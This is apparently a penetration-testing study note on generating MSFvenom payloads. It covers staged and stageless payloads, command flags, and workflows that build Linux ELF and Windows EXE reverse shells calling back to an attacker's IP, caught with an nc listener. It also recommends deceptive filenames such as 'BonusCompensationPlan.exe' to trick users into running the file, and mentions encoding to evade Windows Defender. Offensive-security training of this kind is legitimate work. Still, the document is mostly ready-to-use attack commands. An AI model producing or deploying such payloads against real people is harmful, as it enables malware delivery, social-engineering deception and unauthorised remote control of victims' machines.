# Crafting Payloads with MSFvenom

MSFvenom is used to craft payloads for situations where **direct network access** to a vulnerable target is unavailable. This approach allows for payload delivery via **social engineering** (e.g., email) to induce a user to execute the file manually.

## Payload Selection Methodology

Choosing between **staged** and **stageless** payloads depends on the target environment's constraints and the need for evasion.

### Staged vs. Stageless Payloads

|Payload Type|Mechanism|Selection Criteria|
|:--|:--|:--|
|**Staged**|Sends a small initial "stage" that executes and then downloads the remainder of the payload over the network.|Use when specific Metasploit exploit modules require it; however, the stage consumes memory and can be unstable in high-latency environments.|
|**Stageless**|The payload is sent in its entirety without a secondary stage.|Use in **low bandwidth or high latency** environments to increase stability. Preferred for **evasion** due to reduced network traffic during execution.|

### Identification via Naming Convention

The naming structure in MSFvenom indicates the payload type:

- **Staged:** Uses forward slashes `/` to separate stages (e.g., `windows/meterpreter/reverse_tcp`).
- **Stageless:** Combines the shell and communication method with underscores `_` (e.g., `windows/meterpreter_reverse_tcp`).

## Command Reference

|Flag / Parameter|Function|
|:--|:--|
|`-l payloads`|Lists all available framework payloads.|
|`-p`|Defines the specific payload to be created.|
|`LHOST`|The **IP address** of the attack machine the payload will connect back to.|
|`LPORT`|The **port** on the attack machine used to catch the shell.|
|`-f`|Specifies the **output format** (e.g., `elf` for Linux, `exe` for Windows).|

## Operational Workflows

### Workflow 1: Creating and Catching a Linux Stageless Payload

Use this workflow to target Linux systems (e.g., Ubuntu) via social engineering.

1. **Generate the payload:** Specify the Linux architecture and desired output filename.
    
    ```
    msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACK_IP> LPORT=<PORT> -f elf > <FILENAME>.elf
    ```
    
2. **Start a listener:** Prepare the attack machine to receive the connection before the victim executes the file.
    
    ```
    sudo nc -lvnp <PORT>
    ```
    
3. **Execution:** Once the user executes the file, the listener will establish a command shell session.
    

### Workflow 2: Creating a Windows Stageless Payload

Use this workflow to generate an executable for Windows targets.

1. **Generate the payload:**
    
    ```
    msfvenom -p windows/shell_reverse_tcp LHOST=<ATTACK_IP> LPORT=<PORT> -f exe > <FILENAME>.exe
    ```
    
2. **Bypass Considerations:**
    
    - **Failure Condition:** Payloads generated without encoding or encryption are highly likely to be detected by **Windows Defender AV**.
    - If AV is disabled or bypassed, the shell is caught using the same `nc` listener method as Linux.

## Attack Implications

- **Social Engineering:** Using inconspicuous filenames (e.g., `createbackup.elf` or `BonusCompensationPlan.exe`) increases the likelihood of user execution.
- **AV Evasion:** MSFvenom supports encryption and encoding to bypass signature-based detection, which is critical for Windows-based targets.